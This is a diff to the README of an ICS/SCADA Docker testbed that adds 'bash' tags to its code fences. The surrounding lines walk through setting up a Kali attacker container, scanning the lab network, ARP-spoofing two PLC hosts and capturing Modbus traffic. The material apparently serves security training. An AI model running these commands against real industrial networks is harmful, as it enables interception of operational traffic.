@@ -9,7 +9,7 @@ At this level, we consider you've installed the original testbed network (i.e fr
 
 Docker Containers
 
-```
+```bash
 docker ps 
 ```
 
@@ -51,7 +51,7 @@ Displays the list of containers, you should have 06 plcs running, scadaBR and si
 ## *Accessing the Components on via the docker cli*
 
 bash:
-```
+```bash
 # For plc11
 docker exec -it plc11 bash 
 # For plc12
@@ -64,7 +64,7 @@ docker exec -it plc12 bash
 ## *Setting up the attacker's machine*
 
 Docker command:
-```
+```bash
 sudo docker run -d -t --net swat --hostname attacker --name attacker --privileged --ip 172.18.0.18 -p 10018:8080 kalilinux/kali-rolling
 ```
 
@@ -81,7 +81,7 @@ Docker container
 ## *Accessing the attacker's machine via the docker cli*
 
 bash:
-```
+```bash
 docker exec -it attacker bash
 ```
 
@@ -92,7 +92,7 @@ docker exec -it attacker bash
 When in the attacker's machine, you could install and run the tools you wish. For our examples, we used these tools for information gathering : 
 
 Attacker's terminal
-```
+```bash
 nmap -sn 172.18.0.0/24
 arp-scan --interface=eth0 172.18.0.0/24
 ```
@@ -109,7 +109,7 @@ tcpdump and wireshark were used for this, they are very easy to install on linux
 ### Spoofing using arpspoof
 
 Attacker's terminal
-```
+```bash
 arpspoof -i eth0 -t 172.18.0.10 172.18.0.11
 arpspoof -i eth0 -t 172.18.0.11 172.18.0.10
 ```
@@ -117,7 +117,7 @@ arpspoof -i eth0 -t 172.18.0.11 172.18.0.10
 - You have to do this on two different terminals. Afterword, you could run tcpdump command on another terminal
 
 Attacker terminal
-```
+```bash
 tcpdump -i eth0 port 502 -w modbus_traffic.pcap
 ```
 
@@ -126,7 +126,7 @@ tcpdump -i eth0 port 502 -w modbus_traffic.pcap
 - There're some pcap samples found in `Captured_packets`
 
 bash
-```
+```bash
 docker cp attacker:/scripts/modbus_traffic.pcap ./analysis
 ```
 
